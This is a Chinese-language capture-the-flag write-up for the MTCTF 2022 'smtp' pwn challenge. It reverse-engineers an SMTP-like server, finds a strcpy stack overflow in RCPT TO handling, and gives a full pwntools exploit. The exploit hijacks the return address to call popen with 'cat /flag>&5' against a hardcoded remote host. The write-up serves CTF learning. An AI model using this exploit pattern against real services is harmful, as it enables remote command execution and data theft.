---
title: MTCTF-smtp
date: 2023-03-21 19:15:16
categories: 
- pwn_wp
tags: 
- pwn
- protocol

---

mtctf2022，一道协议题，这种题大多难在逆向，漏洞本身没什么难度。

<!-- more -->

32位的，就开了NX。

```sh
[*] '/home/a1ph0nse/PwnPractice/OwnStudy/smtp/docker/bin/pwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### 逆向

main函数起了一个listener，默认端口是9999。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( argc == 2 )
    listener((char *)argv[1]);
  listener("9999");
}
```

跟进去看一下：

里面有很多和网络编程有关的结构：

解析hostname的addrinfo结构，以及

```c
#include<netdb.h>
struct addrinfo {
    int ai_flags;   /* AI_PASSIVE, AI_CANONNAME, AI_NUMERICHOST */
    int ai_family;  /* PF_xxx */
    int ai_socktype;    /* SOCK_xxx */
    int ai_protocol;    /* 0 or IPPROTO_xxx for IPv4 and IPv6 */
    socklen_t ai_addrlen;   /* length of ai_addr */
    char    *ai_canonname;  /* canonical name for hostname */
    struct  sockaddr *ai_addr;  /* binary address */
    struct  addrinfo *ai_next;  /* next structure in linked list */
};

// 通过hostname、service和hints限定域名、服务/端口、期望的addrinfo来返回addrinfo结构链表（result）
int getaddrinfo( const char *hostname, const char *service, const struct addrinfo *hints, struct addrinfo **result );
getaddrinfo(0, service, &s, &pai);

// 之后通过这个链表来创建socket
fd = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);
```

之后设置socket的选项，绑定本地地址，并在该socket上监听。

之后使用epoll进行事件触发：

```c
typedef union epoll_data {
    void *ptr;
    int fd;
    __uint32_t u32;
    __uint64_t u64;
} epoll_data_t;
 
struct epoll_event {
    __uint32_t events; /* Epoll events */
    epoll_data_t data; /* User data variable */
};

// 创建一个epoll的句柄，size用来告诉内核这个监听的数目的大致数目，而不是能够处理的事件的最大个数。
int epoll_create(int size);

// epoll的事件注册函数，epoll_ctl向 epoll对象中添加、修改或者删除感兴趣的事件，返回0表示成功，否则返回–1，此时需要根据errno错误码判断错误类型。
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);

// 等待事件的产生。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个 maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。如果返回–1，则表示出现错误，需要检查 errno错误码判断错误类型。
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);
```

等待连接，监听到连接后便开启一个新线程`session_worker`对连接进行处理，接收参数`arg`：

```c
//返回值：成功：fileno 出错：-1
int accept(int sockfd,struct sockaddr * addr,socklen_t* addrlen);

v11 = accept(fd, &addr, &addr_len);
arg = malloc(0x14u);
*(_DWORD *)arg = v11;
*((_DWORD *)arg + 1) = 0;
pthread_create(&newthread, 0, (void *(*)(void *))session_worker, arg);
puts("listener: initiated a new session worker");
```

进`session_worker`看看：

首先会保存旧的arg并对其进行reset，arg结构大概如下：

```c
struct session_arg{
    int fd=old_arg.fd;
    int State=0;
    int Mail=-1;
    int Recp=0;
    struct session_data* Data;
}
struct session_data{
    dd data_from=0;
    dd data_to=0;
   	dd recv_msg=0;
}
```

`reset`后会显示连接成功，注册事件并继续等待，申请一个0x400的`request`接收请求。

在`parse_request`中对`request`进行解析，会返回一个`DWORD[2]`的任务编码`cmd_code`：

```c
struct cmd{
    int code;
    dd argument;
}

code=-1 argument=0:识别错误
code=0 argument=argument_string_start:开头为HELO
code=1 argument=argument_string_start:开头为MAIL FROM:
code=2 argument=argument_string_start:开头为RCPT TO:
code=3 argument=argument_string_start:开头为DATA
code=4 argument=argument_string_start:开头为.\r\n或以\r\n.\r\n结尾
code=5 argument=argument_string_start:开头为QUIT
argument_string_start可以为null
```

在这之后，如果满足`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`就会走下面的程序流：

如果满足`old_arg->State == 4 && *(_DWORD *)cmd_code == 4 && strlen((const char *)request) > 3`，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`。

否则会在`old_data`中保存`session_data`并将`request`存在`recv_msg`中。

之后就会按照`cmd_code`进行不同的操作：

```c
// 均对old_arg操作(初始State=0)
code=-1:syntax error
code=0:reset(old_arg)，设置State=1并执行Recp=argument
code=1:需要State==1，设置State=2并执行Data->data_from=argument
code=2:需要State==2 or ==3，设置State=3并执行Data->data_to=argument
code=3:需要State!=3，设置State=4
code=4:需要State==4，创建一个新线程sender_worker提交Data，reset(old_arg)，设置State=1
code=5:需要State==5，设置State=5，会结束这次session
```

否则，也就是`old_arg->State == 4 || *(_DWORD *)cmd_code == 4`不满足：

如果`recv_msg`中有内容，那么就会将`recv_msg`和`request`连接在一起放入`recv_msg`，否则直接将`request`放入`recv_msg`

再深入看看`sender_worker`：

输出`data_from`，若其长度<= 0x4F则copy到`bss段中的from`处

输出`data_to`，若其长度>0xFF(255)则copy到s处，存在**栈溢出**。

```c
char s[256]; // [esp+Ch] [ebp-10Ch] BYREF  
if ( len <= 0xFFu )
  {
    printf("sender: TO: %s\n", v3->data_to);
  }
else
  {
    memset(s, 0, sizeof(s));
    strcpy(s, (const char *)v3->data_to);       // 栈溢出
    printf("sender: TO: %s\n", s);
  }
```

最后输出`recv_msg`。

### 利用

在`sender_worker`中存在栈溢出，若`data_to`长度>0xFF(255)则copy到s(ebp-0x10c)处，存在**栈溢出**。若`data_from`长度<= 0x4F则copy到`bss段中的from`处。

由于每次都会创建一个新的`sender_worker`线程完成工作，因此难以采取ret2libc。但`data_from`保存在`bss`段中，可以试试往里面写入shellcode（虽然这里是RW，但还是试试吧），通过栈溢出劫持程序到此处运行shellcode。

尝试的时候遇到了个问题，程序会卡在一个地方。

```sh
   # eax=0x61616161
   0x8049ac5 <sender_worker+295>    add    esp, 0x10
   0x8049ac8 <sender_worker+298>    mov    eax, dword ptr [ebp - 0xc]
 ► 0x8049acb <sender_worker+301>    mov    eax, dword ptr [eax + 8] # 会卡在这里
   0x8049ace <sender_worker+304>    test   eax, eax
   0x8049ad0 <sender_worker+306> 
```

估计是因为变量v3被覆盖，找不到`recv_msg`了，需要找一个地址`addr`，并且`addr+0x8`可以访问。

最后虽然跳转到覆盖的返回地址，但果然bss段里面的shellcode无法执行。

据说`popen()`函数可以执行`sh`指令，尝试一下。

```c
FILE * popen( const char * command,const char * type);

//popen()会调用fork()产生子进程，然后从子进程中调用/bin/sh -c来执行参数command的指令。参数type可使用“r”代表读取，“w”代表写入。依照此type值，popen()会建立管道连到子进程的标准输出设备或标准输入设备，然后返回一个文件指针。随后进程便可利用此文件指针来读取子进程的输出设备或是写入到子进程的标准输入设备中。此外，所有使用文件指针(FILE*)操作的函数也都可以使用，除了fclose()以外。

//如果 type 为 r，那么调用进程读进 command 的标准输出。
//如果 type 为 w，那么调用进程写到 command 的标准输入。
```

执行`sh`好像没有用，虽然运行了`/bin/dash`，但输出过去的信息不会产生作用，不知道是不是因为没有send回来。

后面换了`cat /flag>&5`，在本地起的可以返回`flag`。

但远程的不行，可能是因为本地用的`fd`刚好是5，但远程的不是。

爆破远程的`fd`到1030都不行，可能是因为其他原因吧，docker的和远程一样都不行。

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='i386')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('./libc.so.6')
# p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
# p=remote('localhost',9999)
p=remote('43.142.108.3',28972)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
def Hello():
    r()
    sl("HELO")


def Mail_from(content):
    r()
    sl(b'MAIL FROM:'+content)

def Rcpt_to(content):
    r()
    sl(b'RCPT TO:'+content)

def Data():
    r()
    sl(b'DATA')


def Sender():
    r()
    sl('.\r\n')

a_str=0x0804B141
from_addr=0x0804d140
Hello()
payload=b"cat /flag>&5"
Mail_from(payload)
payload=b'a'*0x100+p32(from_addr+0x40)+b'a'*0xc+p32(elf.plt['popen'])+p32(0xdeadbeef)+p32(from_addr)+p32(elf.search(b"r\x00").__next__())
Rcpt_to(payload)
Data()
Sender()
ru("250 Ok\n")
flag=ru("\n")
leak("flag",flag)
itr()
```



